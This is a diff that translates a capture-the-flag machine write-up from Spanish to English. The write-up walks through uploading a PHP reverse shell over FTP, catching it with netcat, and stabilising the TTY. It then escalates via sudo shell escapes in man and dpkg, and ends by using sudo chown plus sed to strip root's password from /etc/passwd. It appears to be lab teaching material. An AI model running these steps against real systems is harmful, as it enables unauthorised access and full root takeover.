@@ -26,49 +26,46 @@ More precise scan of the FTP port:
 ```
 ![alt text](Imagenes/Anon_1.png)
 
-Vemos que parece los ficheros de una pagina web , hay un directrio muy interesante que se llama 
-"upload". Posiblemente tengamos que subir algun fichero para hacer una shell reversa.
+We see what appears to be files from a web page, there's a very interesting directory called "upload". We may need to upload some file to create a reverse shell.
 
 ## Examining the Web Page and Its Infrastructure
-Si examinamos la pagina nos esntoramos lo siguiente:
+If we examine the page, we find the following:
 
 ![alt text](Imagenes/Anon_2.png)
 
-Lo mas importante en la barra es el menu "Acceder al backend" si pinchamos nos dirige a la carpeta upload:
+The most important thing in the bar is the "Access backend" menu. If we click on it, it takes us to the upload folder:
 
 ## Intrusion
 
-Para hacer la intrusion he usado este script de github de "pentestmonkey"
+For the intrusion, I used this GitHub script from "pentestmonkey"
 
 https://github.com/pentestmonkey/php-reverse-shell
 
-Por lo tanto he usado la herramienta ftp para subir el fichero reverse.php configurando nuestra IP y nuestro puerto
-y usando la herrameinta netcat para hacer la conexion.
+Therefore, I used the ftp tool to upload the reverse.php file, configuring our IP and our port, and using the netcat tool to make the connection.
 
 ![alt text](Imagenes/Anon_3.png)
 
-Si nos ponemos en escucha por el puerto 1234 con netcat:
+If we listen on port 1234 with netcat and execute the .php file in the browser, it returns the shell
 
 ```ruby
 nc -lvnp 1234
 ```
 
-y ejecutamos en el neavegador el archivo .php nos devuleve la shell
 ![alt text](Imagenes/Anon_4.png)
 
-Por lo tanto estamos autenticados como el usuario "data"
+Therefore, we are authenticated as the "data" user
 
 # Tratamiento de la TTY
 
-Para que nos sea más comodo vamos a hacer un tratamiento a la terminal para que no haya errores en algunos comados 
-y funcionen.
+To make it more comfortable for us, we're going to treat the terminal so that there are no errors in some commands and they work.
 
-Para ello lo primero ejecutamos la siguiente orden :
+For this, we first execute the following order:
 
 ```ruby 
 script /dev/null -c bash
 ```
-Pulsamos ctlr + Z salimos de la terminal y hacemos el siguientes comandos:
+
+We press ctrl + Z to exit the terminal and do the following commands:
 
 ```ruby 
 stty raw -echo;fg
@@ -77,15 +74,17 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-tendremos una terminal mas comoda.
+We will have a more comfortable terminal.
 
 ## Escalation privilege
 
-Para la escalada de privilegios vamos a utilizar el siguiente comando:
+For privilege escalation, we will use the following command:
+
 ```ruby
 sudo -l
 ``
-Vemos los comandos que podemos ejecutar como root u otros usarios usando sudo:
+We see the commands we can execute as root or other users using sudo: 
+
 ```ruby
 $ sudo -l
 Matching Defaults entries for www-data on debddace088e:
@@ -95,20 +94,23 @@ User www-data may run the following commands on debddace088e:
     (pingu) NOPASSWD: /usr/bin/man
 ```
 
-Por lo tanto si ejecutamos la siguiente comando podemos hacerlo como el usuario pingu
+Therefore, if we execute the following command, we can do it as the pingu user
 
 ```ruby
 sudo -u pingu man man
 ```
-Dentro del manual podemos ejecutar la siguiente 
+
+Inside the manual, we can execute the following:
+
 ```ruby
 !/bin/bash
 ```
-Vemos que nos mudamos de usuario y accedemos como pingu 
+
+We see that we change users and access as pingu
 
 ![alt text](Imagenes/Anon_5.png)
 
-Si ejecutamos la orden anterior vemos nuevos comandos que podemos ejecutar como el ususario gladys 
+If we execute the previous order, we see new commands that we can execute as the gladys user
 
 ```ruby
 Matching Defaults entries for pingu on 34882fa66e15:
@@ -122,19 +124,19 @@ User pingu may run the following commands on 34882fa66e15:
 
 ```
 
-Si vamos a la pagina de GTObins vemos que podemos explotarlar de la siguiente manera:
+If we go to the GTObins page, we see that we can exploit it in the following way:
 
 ```ruby
 sudo -u gladys dpkg -l
 !/bin/sh
 ```
 
-Ganamos acceso con el usuario "gladys" de forma similar a la anterior.
+We gain access with the "gladys" user in a similar way to the previous one.
 
 ![alt text](Imagenes/Anon_6.png)
 
 
-Si volvemos a ejecutar el comando  `sudo -l` 
+If we execute the `sudo -l` command again
 
 ```ruby
 Matching Defaults entries for gladys on 34882fa66e15:
@@ -146,22 +148,21 @@ User gladys may run the following commands on 34882fa66e15:
     (root) NOPASSWD: /usr/bin/chown
 ```
 
-Para hacer esta escalada podemos hacerla de varias maneras , la forma mas sencilla es intentar editar el archivo `/etc/passwd`
-quitando para ello la comprobacion cuando se pide la contraseña del usuario root.
+To do this escalation, we can do it in several ways. The simplest way is to try to edit the `/etc/passwd` file, removing the check when the root user's password is requested.
 
-Para ello tenemos que darle permiso al usuario gladys y posteriormente sobreescribir el archivo.
+For this, we have to give permission to the gladys user and then overwrite the file
 
 ```ruby
 sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
 ```
 
-Luego con la herramienta `sed` eliminamos el caracter "x" que tiene en la linea root , creamos un archivo temporal en /tmp
+Then with the `sed` tool we remove the "x" character that is in the root line, we create a temporary file in /tmp.
 
 ```ruby
 sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp
 ```
 
-Por ultimo sobreescribimos el fichero `/etc/passwd`
+Finally, we overwrite the `/etc/passwd` file
 
 ```ruby 
 cp /tmp/passwd.tmp /etc/passwd
